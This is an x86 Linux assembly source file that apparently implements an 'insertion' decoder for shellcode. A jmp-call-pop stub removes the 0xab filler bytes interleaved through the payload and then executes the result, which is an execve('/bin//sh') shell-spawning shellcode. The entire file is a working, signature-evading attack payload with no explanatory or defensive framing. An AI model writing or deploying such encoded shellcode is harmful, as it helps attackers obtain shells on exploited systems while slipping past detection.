; insertDecode.asm

global _start

section .text

_start:
	jmp short shellcode

decoder:
	pop esi
	inc esi
	xor ebx,ebx
	xor ecx,ecx
	mov cl,25

decode:
	mov al, [esi+ebx*2+1]
	mov [esi+ebx], al
	inc ebx
	loop decode
	jmp short eshellcode
shellcode:
	call decoder
	eshellcode: db 0x31,0xab,0xc0,0xab,0x50,0xab,0x68,0xab,0x6e,0xab,0x2f,0xab,0x73,0xab,0x68,0xab,0x68,0xab,0x2f,0xab,0x2f,0xab,0x62,0xab,0x69,0xab,0x89,0xab,0xe3,0xab,0x50,0xab,0x89,0xab,0xe2,0xab,0x53,0xab,0x89,0xab,0xe1,0xab,0xb0,0xab,0x0b,0xab,0xcd,0xab,0x80,0xab